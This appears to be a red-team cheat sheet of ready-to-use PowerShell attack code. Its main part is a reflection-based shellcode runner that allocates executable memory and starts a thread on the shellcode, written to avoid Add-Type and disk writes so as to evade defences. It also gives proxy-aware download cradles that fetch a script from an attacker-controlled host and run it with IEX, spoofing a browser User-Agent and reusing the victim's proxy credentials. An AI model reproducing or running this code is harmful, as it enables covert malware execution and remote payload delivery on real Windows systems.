---
tags:
  - Defense_Evasion
  - Execution
  - Foundational
  - PowerShell
  - Windows
---

## DelegateType Reflection Shellcode Runner
resources: [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

> [!tip] Pure reflection-based shellcode execution. No **Add-Type**, no disk writes.

### Complete Reflection Runner
```powershell
function LookupFunc {
    Param(
        [Parameter(Mandatory=$true)][String]$Module,
        [Parameter(Mandatory=$true)][String]$Function
    )

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') })
    $unsafeNativeMethods = $assem.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

    $kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $handleRef = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $kern32Handle)

    return $GetProcAddress.Invoke($null, @($handleRef, $Function))
}

function getDelegateType {
    Param(
        [Parameter(Mandatory=$true)][Type[]]$func,
        [Parameter(Mandatory=$true)][Type]$delType
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

# Get VirtualAlloc
$vaAddr = LookupFunc "kernel32.dll" "VirtualAlloc"
$vaDelegate = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vaAddr, $vaDelegate)

# Get CreateThread
$ctAddr = LookupFunc "kernel32.dll" "CreateThread"
$ctDelegate = getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, $ctDelegate)

# Get WaitForSingleObject
$wfsoAddr = LookupFunc "kernel32.dll" "WaitForSingleObject"
$wfsoDelegate = getDelegateType @([IntPtr], [Int32]) ([Int])
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wfsoAddr, $wfsoDelegate)

# Shellcode
[Byte[]]$buf = 0xfc,0x48,0x83,...

# Allocate, copy, execute
$mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)
$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)
```

## Proxy-Aware Communication

> [!important] Ensure payloads work through corporate proxies.

### PowerShell Proxy Configuration
```powershell
# Use system proxy
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
```

### Proxy-Aware Download Cradle
```powershell
$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
$wc = New-Object System.Net.WebClient
$wc.Proxy = $proxy
IEX($wc.DownloadString('http://<AttackerIP>/payload.ps1'))
```

### Custom User-Agent
```powershell
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
IEX($wc.DownloadString('http://<AttackerIP>/payload.ps1'))
```

### SYSTEM Proxy Access
> [!warning] When running as SYSTEM, proxy settings are in different location.

```powershell
# Read proxy from registry (works for SYSTEM context)
$proxyAddr = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
if ($proxyAddr) {
    $proxy = New-Object System.Net.WebProxy($proxyAddr)
    $wc = New-Object System.Net.WebClient
    $wc.Proxy = $proxy
}
```
